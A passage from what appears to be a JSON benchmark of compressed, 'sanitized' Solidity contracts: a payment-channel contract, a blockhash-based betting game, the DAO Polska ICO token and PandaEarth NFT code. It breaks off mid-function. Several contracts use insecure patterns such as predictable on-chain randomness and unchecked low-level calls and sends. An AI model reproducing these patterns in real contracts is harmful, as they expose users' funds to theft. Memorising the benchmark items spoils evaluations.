updateBal[3];\nvirtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\nemit DidVCSettle(_lcID, _vcID, updateSeq, updateBal[0], updateBal[1], msg.sender, virtualChannels[_vcID].updateVCtimeout);\n}\nfunction closeVirtualChannel(bytes32 _lcID, bytes32 _vcID) public {\nrequire(Channels[_lcID].isOpen, \"LC is closed.\");\nrequire(virtualChannels[_vcID].isInSettlementState, \"VC is not in settlement state.\");\nrequire(virtualChannels[_vcID].updateVCtimeout < now, \"Update vc timeout has not elapsed.\");\nrequire(!virtualChannels[_vcID].isClose, \"VC is already closed\");\nChannels[_lcID].numOpenVC--;\nvirtualChannels[_vcID].isClose = true;\nif(virtualChannels[_vcID].partyA == Channels[_lcID].partyAddresses[0]) {\nChannels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[0];\nChannels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[1];\nChannels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[0];\nChannels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[1];\n} else if (virtualChannels[_vcID].partyB == Channels[_lcID].partyAddresses[0]) {\nChannels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[1];\nChannels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[0];\nChannels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[1];\nChannels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[0];\n}\nemit DidVCClose(_lcID, _vcID, virtualChannels[_vcID].erc20Balances[0], virtualChannels[_vcID].erc20Balances[1]);\n}\nfunction byzantineCloseChannel(bytes32 _lcID) public {\nChannel storage channel = Channels[_lcID];\nrequire(channel.isOpen, \"Channel is not open\");\nrequire(channel.isUpdateLCSettling == true);\nrequire(channel.numOpenVC == 0);\nrequire(channel.updateLCtimeout < now, \"LC timeout over.\");\nuint256 totalEthDeposit = channel.initialDeposit[0] + channel.ethBalances[2] + channel.ethBalances[3];\nuint256 totalTokenDeposit = channel.initialDeposit[1] + channel.erc20Balances[2] + channel.erc20Balances[3];\nuint256 possibleTotalEthBeforeDeposit = channel.ethBalances[0] + channel.ethBalances[1];\nuint256 possibleTotalTokenBeforeDeposit = channel.erc20Balances[0] + channel.erc20Balances[1];\nif(possibleTotalEthBeforeDeposit < totalEthDeposit) {\nchannel.ethBalances[0]+=channel.ethBalances[2];\nchannel.ethBalances[1]+=channel.ethBalances[3];\n} else {\nrequire(possibleTotalEthBeforeDeposit == totalEthDeposit);\n}\nif(possibleTotalTokenBeforeDeposit < totalTokenDeposit) {\nchannel.erc20Balances[0]+=channel.erc20Balances[2];\nchannel.erc20Balances[1]+=channel.erc20Balances[3];\n} else {\nrequire(possibleTotalTokenBeforeDeposit == totalTokenDeposit);\n}\nuint256 ethbalanceA = channel.ethBalances[0];\nuint256 ethbalanceI = channel.ethBalances[1];\nuint256 tokenbalanceA = channel.erc20Balances[0];\nuint256 tokenbalanceI = channel.erc20Balances[1];\nchannel.ethBalances[0] = 0;\nchannel.ethBalances[1] = 0;\nchannel.erc20Balances[0] = 0;\nchannel.erc20Balances[1] = 0;\nif(ethbalanceA != 0 || ethbalanceI != 0) {\nchannel.partyAddresses[0].transfer(ethbalanceA);\nchannel.partyAddresses[1].transfer(ethbalanceI);\n}\nif(tokenbalanceA != 0 || tokenbalanceI != 0) {\nrequire(\nchannel.token.transfer(channel.partyAddresses[0], tokenbalanceA),\n\"byzantineCloseChannel: token transfer failure\"\n);\nrequire(\nchannel.token.transfer(channel.partyAddresses[1], tokenbalanceI),\n\"byzantineCloseChannel: token transfer failure\"\n);\n}\nchannel.isOpen = false;\nnumChannels--;\nemit DidLCClose(_lcID, channel.sequence, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI);\n}\nfunction _isContained(bytes32 _hash, bytes _proof, bytes32 _root) internal pure returns (bool) {\nbytes32 cursor = _hash;\nbytes32 proofElem;\nfor (uint256 i = 64; i <= _proof.length; i += 32) {\nassembly { proofElem := mload(add(_proof, i)) }\nif (cursor < proofElem) {\ncursor = keccak256(abi.encodePacked(cursor, proofElem));\n} else {\ncursor = keccak256(abi.encodePacked(proofElem, cursor));\n}\n}\nreturn cursor == _root;\n}\nfunction getChannel(bytes32 id) public view returns (\naddress[2],\nuint256[4],\nuint256[4],\nuint256[2],\nuint256,\nuint256,\nbytes32,\nuint256,\nuint256,\nbool,\nbool,\nuint256\n) {\nChannel memory channel = Channels[id];\nreturn (\nchannel.partyAddresses,\nchannel.ethBalances,\nchannel.erc20Balances,\nchannel.initialDeposit,\nchannel.sequence,\nchannel.confirmTime,\nchannel.VCrootHash,\nchannel.LCopenTimeout,\nchannel.updateLCtimeout,\nchannel.isOpen,\nchannel.isUpdateLCSettling,\nchannel.numOpenVC\n);\n}\nfunction getVirtualChannel(bytes32 id) public view returns(\nbool,\nbool,\nuint256,\naddress,\nuint256,\naddress,\naddress,\naddress,\nuint256[2],\nuint256[2],\nuint256[2]\n) {\nVirtualChannel memory virtualChannel = virtualChannels[id];\nreturn(\nvirtualChannel.isClose,\nvirtualChannel.isInSettlementState,\nvirtualChannel.sequence,\nvirtualChannel.challenger,\nvirtualChannel.updateVCtimeout,\nvirtualChannel.partyA,\nvirtualChannel.partyB,\nvirtualChannel.partyI,\nvirtualChannel.ethBalances,\nvirtualChannel.erc20Balances,\nvirtualChannel.bond\n);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 132,
        "mode": "compressed",
        "original_lines": 867,
        "transformed_lines": 653,
        "original_chars": 35121,
        "transformed_chars": 21380,
        "compression_ratio": 0.61
      },
      "error": null
    },
    {
      "original_id": "sn_ds_212",
      "transformed_id": "ss_l1_compressed_sn_ds_212",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract PoCGame {\nmodifier onlyOwner() {\nrequire(msg.sender == owner);\n_;\n}\nmodifier isOpenToPublic() {\nrequire(openToPublic);\n_;\n}\nmodifier onlyRealPeople() {\nrequire (msg.sender == tx.origin);\n_;\n}\nmodifier onlyPlayers() {\nrequire (wagers[msg.sender] > 0);\n_;\n}\nevent Wager(uint256 amount, address depositer);\nevent Win(uint256 amount, address paidTo);\nevent Lose(uint256 amount, address loser);\nevent Donate(uint256 amount, address paidTo, address donator);\nevent DifficultyChanged(uint256 currentDifficulty);\nevent BetLimitChanged(uint256 currentBetLimit);\naddress private whale;\nuint256 betLimit;\nuint difficulty;\nuint private randomSeed;\naddress owner;\nmapping(address => uint256) timestamps;\nmapping(address => uint256) wagers;\nbool openToPublic;\nuint256 totalDonated;\nconstructor(address whaleAddress, uint256 wagerLimit)\nonlyRealPeople()\npublic {\nopenToPublic = false;\nowner = msg.sender;\nwhale = whaleAddress;\ntotalDonated = 0;\nbetLimit = wagerLimit;\n}\nfunction OpenToThePublic()\nonlyOwner()\npublic {\nopenToPublic = true;\n}\nfunction AdjustBetAmounts(uint256 amount)\nonlyOwner()\npublic {\nbetLimit = amount;\nemit BetLimitChanged(betLimit);\n}\nfunction AdjustDifficulty(uint256 amount)\nonlyOwner()\npublic {\ndifficulty = amount;\nemit DifficultyChanged(difficulty);\n}\nfunction() public payable { }\nfunction wager()\nisOpenToPublic()\nonlyRealPeople()\npayable\npublic {\nrequire(msg.value == betLimit);\nrequire(wagers[msg.sender] == 0);\ntimestamps[msg.sender] = block.number;\nwagers[msg.sender] = msg.value;\nemit Wager(msg.value, msg.sender);\n}\nfunction play()\nisOpenToPublic()\nonlyRealPeople()\nonlyPlayers()\npublic {\nuint256 blockNumber = timestamps[msg.sender];\nif(blockNumber < block.number) {\ntimestamps[msg.sender] = 0;\nwagers[msg.sender] = 0;\nuint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber), msg.sender)))%difficulty +1;\nif(winningNumber == difficulty / 2) {\npayout(msg.sender);\n}\nelse {\nloseWager(betLimit / 2);\n}\n}\nelse {\nrevert();\n}\n}\nfunction donate()\nisOpenToPublic()\npublic\npayable {\ndonateToWhale(msg.value);\n}\nfunction payout(address winner)\ninternal {\nuint256 ethToTransfer = address(this).balance / 2;\nwinner.transfer(ethToTransfer);\nemit Win(ethToTransfer, winner);\n}\nfunction donateToWhale(uint256 amount)\ninternal {\nwhale.call.value(amount)(bytes4(keccak256(\"donate()\")));\ntotalDonated += amount;\nemit Donate(amount, whale, msg.sender);\n}\nfunction loseWager(uint256 amount)\ninternal {\nwhale.call.value(amount)(bytes4(keccak256(\"donate()\")));\ntotalDonated += amount;\nemit Lose(amount, msg.sender);\n}\nfunction ethBalance()\npublic\nview\nreturns (uint256) {\nreturn address(this).balance;\n}\nfunction currentDifficulty()\npublic\nview\nreturns (uint256) {\nreturn difficulty;\n}\nfunction currentBetLimit()\npublic\nview\nreturns (uint256) {\nreturn betLimit;\n}\nfunction hasPlayerWagered(address player)\npublic\nview\nreturns (bool) {\nif(wagers[player] > 0) {\nreturn true;\n}\nelse {\nreturn false;\n}\n}\nfunction winnersPot()\npublic\nview\nreturns (uint256) {\nreturn address(this).balance / 2;\n}\nfunction transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\npublic\nonlyOwner()\nreturns (bool success) {\nreturn ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n}\n}\ncontract ERC20Interface {\nfunction transfer(address to, uint256 tokens) public returns (bool success);\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 37,
        "mode": "compressed",
        "original_lines": 229,
        "transformed_lines": 161,
        "original_chars": 4733,
        "transformed_chars": 3353,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_213",
      "transformed_id": "ss_l1_compressed_sn_ds_213",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.11;\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\ncontract MigrationAgent {\nfunction migrateFrom(address _from, uint256 _value);\n}\ncontract ERC20 {\nuint public totalSupply;\nfunction balanceOf(address who) constant returns (uint);\nfunction allowance(address owner, address spender) constant returns (uint);\nfunction transfer(address to, uint value) returns (bool ok);\nfunction transferFrom(address from, address to, uint value) returns (bool ok);\nfunction approve(address spender, uint value) returns (bool ok);\nevent Transfer(address indexed from, address indexed to, uint value);\nevent Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract SafeMath {\nfunction safeMul(uint a, uint b) internal returns (uint) {\nuint c = a * b;\nassert(a == 0 || c / a == b);\nreturn c;\n}\nfunction safeDiv(uint a, uint b) internal returns (uint) {\nassert(b > 0);\nuint c = a / b;\nassert(a == b * c + a % b);\nreturn c;\n}\nfunction safeSub(uint a, uint b) internal returns (uint) {\nassert(b <= a);\nreturn a - b;\n}\nfunction safeAdd(uint a, uint b) internal returns (uint) {\nuint c = a + b;\nassert(c>=a && c>=b);\nreturn c;\n}\nfunction max64(uint64 a, uint64 b) internal constant returns (uint64) {\nreturn a >= b ? a : b;\n}\nfunction min64(uint64 a, uint64 b) internal constant returns (uint64) {\nreturn a < b ? a : b;\n}\nfunction max256(uint256 a, uint256 b) internal constant returns (uint256) {\nreturn a >= b ? a : b;\n}\nfunction min256(uint256 a, uint256 b) internal constant returns (uint256) {\nreturn a < b ? a : b;\n}\nfunction assert(bool assertion) internal {\nif (!assertion) {\nthrow;\n}\n}\n}\ncontract StandardToken is ERC20, SafeMath {\nevent Minted(address receiver, uint amount);\nmapping(address => uint) balances;\nmapping(address => uint) balancesRAW;\nmapping (address => mapping (address => uint)) allowed;\nfunction isToken() public constant returns (bool weAre) {\nreturn true;\n}\nfunction transfer(address _to, uint _value) returns (bool success) {\nbalances[msg.sender] = safeSub(balances[msg.sender], _value);\nbalances[_to] = safeAdd(balances[_to], _value);\nTransfer(msg.sender, _to, _value);\nreturn true;\n}\nfunction transferFrom(address _from, address _to, uint _value) returns (bool success) {\nuint _allowance = allowed[_from][msg.sender];\nbalances[_to] = safeAdd(balances[_to], _value);\nbalances[_from] = safeSub(balances[_from], _value);\nallowed[_from][msg.sender] = safeSub(_allowance, _value);\nTransfer(_from, _to, _value);\nreturn true;\n}\nfunction balanceOf(address _owner) constant returns (uint balance) {\nreturn balances[_owner];\n}\nfunction approve(address _spender, uint _value) returns (bool success) {\nif ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nreturn true;\n}\nfunction allowance(address _owner, address _spender) constant returns (uint remaining) {\nreturn allowed[_owner][_spender];\n}\n}\ncontract daoPOLSKAtokens{\nstring public name = \"DAO POLSKA TOKEN version 1\";\nstring public symbol = \"DPL\";\nuint8 public constant decimals = 18;\naddress public owner;\naddress public migrationMaster;\nuint256 public otherchainstotalsupply =1.0 ether;\nuint256 public supplylimit = 10000.0 ether;\nuint256 public totalSupply = 0.0 ether;\naddress public Chain1 = 0x0;\naddress public Chain2 = 0x0;\naddress public Chain3 = 0x0;\naddress public Chain4 = 0x0;\naddress public migrationAgent=0x8585D5A25b1FA2A0E6c3BcfC098195bac9789BE2;\nuint256 public totalMigrated;\nevent Migrate(address indexed _from, address indexed _to, uint256 _value);\nevent Refund(address indexed _from, uint256 _value);\nstruct sendTokenAway{\nStandardToken coinContract;\nuint amount;\naddress recipient;\n}\nmapping(uint => sendTokenAway) transfers;\nuint numTransfers=0;\nmapping (address => uint256) balances;\nmapping (address => uint256) balancesRAW;\nmapping (address => mapping (address => uint256)) allowed;\nevent UpdatedTokenInformation(string newName, string newSymbol);\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent receivedEther(address indexed _from,uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\nevent Burn(address indexed from, uint256 value);\nbool public supplylimitset = false;\nbool public otherchainstotalset = false;\nfunction daoPOLSKAtokens() {\nowner=msg.sender;\nmigrationMaster=msg.sender;\n}\nfunction setSupply(uint256 supplyLOCKER) public {\nif (msg.sender != owner) {\nthrow;\n}\nif (supplylimitset != false) {\nthrow;\n}\nsupplylimitset = true;\nsupplylimit = supplyLOCKER ** uint256(decimals);\n}\nfunction setotherchainstotalsupply(uint256 supplyLOCKER) public {\nif (msg.sender != owner) {\nthrow;\n}\nif (supplylimitset != false) {\nthrow;\n}\notherchainstotalset = true;\notherchainstotalsupply = supplyLOCKER ** uint256(decimals);\n}\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData)\npublic\nreturns (bool success) {\ntokenRecipient spender = tokenRecipient(_spender);\nif (approve(_spender, _value)) {\nspender.receiveApproval(msg.sender, _value, this, _extraData);\nreturn true;\n}\n}\nfunction burn(uint256 _value) public returns (bool success) {\nrequire(balances[msg.sender] >= _value);\nbalances[msg.sender] -= _value;\ntotalSupply -= _value;\nBurn(msg.sender, _value);\nreturn true;\n}\nfunction burnFrom(address _from, uint256 _value) public returns (bool success) {\nrequire(balances[_from] >= _value);\nrequire(_value <= allowed[_from][msg.sender]);\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\ntotalSupply -= _value;\nBurn(_from, _value);\nreturn true;\n}\nfunction transfer(address _to, uint256 _value) returns (bool success) {\nif (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nTransfer(msg.sender, _to, _value);\nreturn true;\n} else { return false; }\n}\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\nif (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\nbalances[_to] += _value;\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\nTransfer(_from, _to, _value);\nreturn true;\n} else { return false; }\n}\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\nreturn balances[_owner];\n}\nfunction approve(address _spender, uint256 _value) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nreturn true;\n}\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\nfunction () payable public {\nif(funding){\nreceivedEther(msg.sender, msg.value);\nbalances[msg.sender]=balances[msg.sender]+msg.value;\n} else throw;\n}\nfunction setTokenInformation(string _name, string _symbol) {\nif (msg.sender != owner) {\nthrow;\n}\nname = _name;\nsymbol = _symbol;\nUpdatedTokenInformation(name, symbol);\n}\nfunction setChainsAddresses(address chainAd, int chainnumber) {\nif (msg.sender != owner) {\nthrow;\n}\nif(chainnumber==1){Chain1=chainAd;}\nif(chainnumber==2){Chain2=chainAd;}\nif(chainnumber==3){Chain3=chainAd;}\nif(chainnumber==4){Chain4=chainAd;}\n}\nfunction DAOPolskaTokenICOregulations() external returns(string wow) {\nreturn 'Regulations of preICO and ICO are present at website  DAO Polska Token.network and by using this smartcontract and blockchains you commit that you accept and will follow those rules';\n}\nfunction sendTokenAw(address StandardTokenAddress, address receiver, uint amount){\nif (msg.sender != owner) {\nthrow;\n}\nsendTokenAway t = transfers[numTransfers];\nt.coinContract = StandardToken(StandardTokenAddress);\nt.amount = amount;\nt.recipient = receiver;\nt.coinContract.transfer(receiver, amount);\nnumTransfers++;\n}\nuint public tokenCreationRate=1000;\nuint public bonusCreationRate=1000;\nuint public CreationRate=1761;\nuint256 public constant oneweek = 36000;\nuint256 public fundingEndBlock = 5433616;\nbool public funding = true;\nbool public refundstate = false;\nbool public migratestate= false;\nfunction createDaoPOLSKAtokens(address holder) payable {\nif (!funding) throw;\nif (msg.value == 0) throw;\nif (msg.value > (supplylimit - totalSupply) / CreationRate)\nthrow;\nvar numTokensRAW = msg.value;\nvar numTokens = msg.value * CreationRate;\ntotalSupply += numTokens;\nbalances[holder] += numTokens;\nbalancesRAW[holder] += numTokensRAW;\nTransfer(0, holder, numTokens);\nuint256 percentOfTotal = 12;\nuint256 additionalTokens = numTokens * percentOfTotal / (100);\ntotalSupply += additionalTokens;\nbalances[migrationMaster] += additionalTokens;\nTransfer(0, migrationMaster, additionalTokens);\n}\nfunction setBonusCreationRate(uint newRate){\nif(msg.sender == owner) {\nbonusCreationRate=newRate;\nCreationRate=tokenCreationRate+bonusCreationRate;\n}\n}\nfunction FundsTransfer() external {\nif(funding==true) throw;\nif (!owner.send(this.balance)) throw;\n}\nfunction PartialFundsTransfer(uint SubX) external {\nif (msg.sender != owner) throw;\nowner.send(this.balance - SubX);\n}\nfunction turnrefund() external {\nif (msg.sender != owner) throw;\nrefundstate=!refundstate;\n}\nfunction fundingState() external {\nif (msg.sender != owner) throw;\nfunding=!funding;\n}\nfunction turnmigrate() external {\nif (msg.sender != migrationMaster) throw;\nmigratestate=!migratestate;\n}\nfunction finalize() external {\nif (block.number <= fundingEndBlock+8*oneweek) throw;\nfunding = false;\nrefundstate=!refundstate;\nif (msg.sender==owner)\nowner.send(this.balance);\n}\nfunction migrate(uint256 _value) external {\nif (migratestate) throw;\nif (_value == 0) throw;\nif (_value > balances[msg.sender]) throw;\nbalances[msg.sender] -= _value;\ntotalSupply -= _value;\ntotalMigrated += _value;\nMigrationAgent(migrationAgent).migrateFrom(msg.sender, _value);\nMigrate(msg.sender, migrationAgent, _value);\n}\nfunction refundTRA() external {\nif (funding) throw;\nif (!refundstate) throw;\nvar DAOPLTokenValue = balances[msg.sender];\nvar ETHValue = balancesRAW[msg.sender];\nif (ETHValue == 0) throw;\nbalancesRAW[msg.sender] = 0;\ntotalSupply -= DAOPLTokenValue;\nRefund(msg.sender, ETHValue);\nmsg.sender.transfer(ETHValue);\n}\nfunction preICOregulations() external returns(string wow) {\nreturn 'Regulations of preICO are present at website  daopolska.pl and by using this smartcontract you commit that you accept and will follow those rules';\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 96,
        "mode": "compressed",
        "original_lines": 443,
        "transformed_lines": 320,
        "original_chars": 14153,
        "transformed_chars": 10416,
        "compression_ratio": 0.74
      },
      "error": null
    },
    {
      "original_id": "sn_ds_214",
      "transformed_id": "ss_l1_compressed_sn_ds_214",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract ERC20 {\nfunction totalSupply() constant returns (uint supply);\nfunction balanceOf( address who ) constant returns (uint value);\nfunction allowance( address owner, address spender ) constant returns (uint _allowance);\nfunction transfer( address to, uint value) returns (bool ok);\nfunction transferFrom( address from, address to, uint value) returns (bool ok);\nfunction approve( address spender, uint value ) returns (bool ok);\nevent Transfer( address indexed from, address indexed to, uint value);\nevent Approval( address indexed owner, address indexed spender, uint value);\n}\ncontract Ownable {\naddress public owner;\nfunction Ownable() {\nowner = msg.sender;\n}\nmodifier onlyOwner() {\nrequire(msg.sender == owner);\n_;\n}\nfunction transferOwnership(address newOwner) onlyOwner {\nif (newOwner != address(0)) {\nowner = newOwner;\n}\n}\n}\ncontract ERC721 {\nfunction totalSupply() public view returns (uint256 total);\nfunction balanceOf(address _owner) public view returns (uint256 balance);\nfunction ownerOf(uint256 _tokenId) external view returns (address owner);\nfunction approve(address _to, uint256 _tokenId) external;\nfunction transfer(address _to, uint256 _tokenId) external;\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external;\nevent Transfer(address from, address to, uint256 tokenId);\nevent Approval(address owner, address approved, uint256 tokenId);\nfunction supportsInterface(bytes4 _interfaceID) external view returns (bool);\n}\ncontract GeneScienceInterface {\nfunction isGeneScience() public pure returns (bool);\nfunction mixGenes(uint256[2] genes1, uint256[2] genes2,uint256 g1,uint256 g2, uint256 targetBlock) public returns (uint256[2]);\nfunction getPureFromGene(uint256[2] gene) public view returns(uint256);\nfunction getSex(uint256[2] gene) public view returns(uint256);\nfunction getWizzType(uint256[2] gene) public view returns(uint256);\nfunction clearWizzType(uint256[2] _gene) public returns(uint256[2]);\n}\ncontract PandaAccessControl {\nevent ContractUpgrade(address newContract);\naddress public ceoAddress;\naddress public cfoAddress;\naddress public cooAddress;\nbool public paused = false;\nmodifier onlyCEO() {\nrequire(msg.sender == ceoAddress);\n_;\n}\nmodifier onlyCFO() {\nrequire(msg.sender == cfoAddress);\n_;\n}\nmodifier onlyCOO() {\nrequire(msg.sender == cooAddress);\n_;\n}\nmodifier onlyCLevel() {\nrequire(\nmsg.sender == cooAddress ||\nmsg.sender == ceoAddress ||\nmsg.sender == cfoAddress\n);\n_;\n}\nfunction setCEO(address _newCEO) external onlyCEO {\nrequire(_newCEO != address(0));\nceoAddress = _newCEO;\n}\nfunction setCFO(address _newCFO) external onlyCEO {\nrequire(_newCFO != address(0));\ncfoAddress = _newCFO;\n}\nfunction setCOO(address _newCOO) external onlyCEO {\nrequire(_newCOO != address(0));\ncooAddress = _newCOO;\n}\nmodifier whenNotPaused() {\nrequire(!paused);\n_;\n}\nmodifier whenPaused {\nrequire(paused);\n_;\n}\nfunction pause() external onlyCLevel whenNotPaused {\npaused = true;\n}\nfunction unpause() public onlyCEO whenPaused {\npaused = false;\n}\n}\ncontract PandaBase is PandaAccessControl {\nuint256 public constant GEN0_TOTAL_COUNT = 16200;\nuint256 public gen0CreatedCount;\nevent Birth(address owner, uint256 pandaId, uint256 matronId, uint256 sireId, uint256[2] genes);\nevent Transfer(address from, address to, uint256 tokenId);\nstruct Panda {\nuint256[2] genes;\nuint64 birthTime;\nuint64 cooldownEndBlock;\nuint32 matronId;\nuint32 sireId;\nuint32 siringWithId;\nuint16 cooldownIndex;\nuint16 generation;\n}\nuint32[9] public cooldowns = [\nuint32(5 minutes),\nuint32(30 minutes),\nuint32(2 hours),\nuint32(4 hours),\nuint32(8 hours),\nuint32(24 hours),\nuint32(48 hours),\nuint32(72 hours),\nuint32(7 days)\n];\nuint256 public secondsPerBlock = 15;\nPanda[] pandas;\nmapping (uint256 => address) public pandaIndexToOwner;\nmapping (address => uint256) ownershipTokenCount;\nmapping (uint256 => address) public pandaIndexToApproved;\nmapping (uint256 => address) public sireAllowedToAddress;\nSaleClockAuction public saleAuction;\nSiringClockAuction public siringAuction;\nGeneScienceInterface public geneScience;\nSaleClockAuctionERC20 public saleAuctionERC20;\nmapping (uint256 => uint256) public wizzPandaQuota;\nmapping (uint256 => uint256) public wizzPandaCount;\nfunction getWizzPandaQuotaOf(uint256 _tp) view external returns(uint256) {\nreturn wizzPandaQuota[_tp];\n}\nfunction getWizzPandaCountOf(uint256 _tp) view external returns(uint256) {\nreturn wizzPandaCount[_tp];\n}\nfunction setTotalWizzPandaOf(uint256 _tp,uint256 _total) external onlyCLevel {\nrequire (wizzPandaQuota[_tp]==0);\nrequire (_total==uint256(uint32(_total)));\nwizzPandaQuota[_tp] = _total;\n}\nfunction getWizzTypeOf(uint256 _id) view external returns(uint256) {\nPanda memory _p = pandas[_id];\nreturn geneScience.getWizzType(_p.genes);\n}\nfunction _transfer(address _from, address _to, uint256 _tokenId) internal {\nownershipTokenCount[_to]++;\npandaIndexToOwner[_tokenId] = _to;\nif (_from != address(0)) {\nownershipTokenCount[_from]--;\ndelete sireAllowedToAddress[_tokenId];\ndelete pandaIndexToApproved[_tokenId];\n}\nTransfer(_from, _to, _tokenId);\n}\nfunction _createPanda(\nuint256 _matronId,\nuint256 _sireId,\nuint256 _generation,\nuint256[2] _genes,\naddress _owner\n)\ninternal\nreturns (uint) {\nrequire(_matronId == uint256(uint32(_matronId)));\nrequire(_sireId == uint256(uint32(_sireId)));\nrequire(_generation == uint256(uint16(_generation)));\nuint16 cooldownIndex = 0;\nif (pandas.length>0){\nuint16 pureDegree = uint16(geneScience.getPureFromGene(_genes));\nif (pureDegree==0) {\npureDegree = 1;\n}\ncooldownIndex = 1000/pureDegree;\nif (cooldownIndex%10 < 5){\ncooldownIndex = cooldownIndex/10;\n}else{\ncooldownIndex = cooldownIndex/10 + 1;\n}\ncooldownIndex = cooldownIndex - 1;\nif (cooldownIndex > 8) {\ncooldownIndex = 8;\n}\nuint256 _tp = geneScience.getWizzType(_genes);\nif (_tp>0 && wizzPandaQuota[_tp]<=wizzPandaCount[_tp]) {\n_genes = geneScience.clearWizzType(_genes);\n_tp = 0;\n}\nif (_tp == 1){\ncooldownIndex = 5;\n}\nif (_tp>0){\nwizzPandaCount[_tp] = wizzPandaCount[_tp] + 1;\n}\nif (_generation <= 1 && _tp != 1){\nrequire(gen0CreatedCount<GEN0_TOTAL_COUNT);\ngen0CreatedCount++;\n}\n}\nPanda memory _panda = Panda({\ngenes: _genes,\nbirthTime: uint64(now),\ncooldownEndBlock: 0,\nmatronId: uint32(_matronId),\nsireId: uint32(_sireId),\nsiringWithId: 0,\ncooldownIndex: cooldownIndex,\ngeneration: uint16(_generation)\n});\nuint256 newKittenId = pandas.push(_panda) - 1;\nrequire(newKittenId == uint256(uint32(newKittenId)));\nBirth(\n_owner,\nnewKittenId,\nuint256(_panda.matronId),\nuint256(_panda.sireId),\n_panda.genes\n);\n_transfer(0, _owner, newKittenId);\nreturn newKittenId;\n}\nfunction setSecondsPerBlock(uint256 secs) external onlyCLevel {\nrequire(secs < cooldowns[0]);\nsecondsPerBlock = secs;\n}\n}\ncontract ERC721Metadata {\nfunction getMetadata(uint256 _tokenId, string) public view returns (bytes32[4] buffer, uint256 count) {\nif (_tokenId == 1) {\nbuffer[0] = \"Hello World! :D\";\ncount = 15;\n} else if (_tokenId == 2) {\nbuffer[0] = \"I would definitely choose a medi\";\nbuffer[1] = \"um length string.\";\ncount = 49;\n} else if (_tokenId == 3) {\nbuffer[0] = \"Lorem ipsum dolor sit amet, mi e\";\nbuffer[1] = \"st accumsan dapibus augue lorem,\";\nbuffer[2] = \" tristique vestibulum id, libero\";\nbuffer[3] = \" suscipit varius sapien aliquam.\";\ncount = 128;\n}\n}\n}\ncontract PandaOwnership is PandaBase, ERC721 {\nstring public constant name = \"PandaEarth\";\nstring public constant symbol = \"PE\";\nbytes4 constant InterfaceSignature_ERC165 =\nbytes4(keccak256('supportsInterface(bytes4)'));\nbytes4 constant InterfaceSignature_ERC721 =\nbytes4(keccak256('name()')) ^\nbytes4(keccak256('symbol()')) ^\nbytes4(keccak256('totalSupply()')) ^\nbytes4(keccak256('balanceOf(address)')) ^\nbytes4(keccak256('ownerOf(uint256)')) ^\nbytes4(keccak256('approve(address,uint256)')) ^\nbytes4(keccak256('transfer(address,uint256)')) ^\nbytes4(keccak256('transferFrom(address,address,uint256)')) ^\nbytes4(keccak256('tokensOfOwner(address)')) ^\nbytes4(keccak256('tokenMetadata(uint256,string)'));\nfunction supportsInterface(bytes4 _interfaceID) external view returns (bool) {\nreturn ((_interfaceID == InterfaceSignature_ERC165) || (_interfaceID == InterfaceSignature_ERC721));\n}\nfunction _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {\nreturn pandaIndexToOwner[_tokenId] == _claimant;\n}\nfunction _approvedFor(address _claimant, uint256 _tokenId) internal view returns (bool) {\nreturn pandaIndexToApproved[_tokenId] == _claimant;\n}\nfunction _approve(uint256 _tokenId, address _approved) internal {\npandaIndexToApproved[_tokenId] = _approved;\n}\nfunction balanceOf(address _owner) public view returns (uint256 count) {\nreturn ownershipTokenCount[_owner];\n}\nfunction transfer(\naddress _to,\nuint256 _tokenId\n)\nexternal\nwhenNotPaused {\nrequire(_to != address(0));\nrequire(_to != address(this));\nrequire(_to != address(saleAuction));\nrequire(_to != address(siringAuction));\nrequire(_owns(msg.sender, _tokenId));\n_transfer(msg.sender, _to, _tokenId);\n}\nfunction approve(\naddress _to,\nuint256 _tokenId\n)\nexternal\nwhenNotPaused 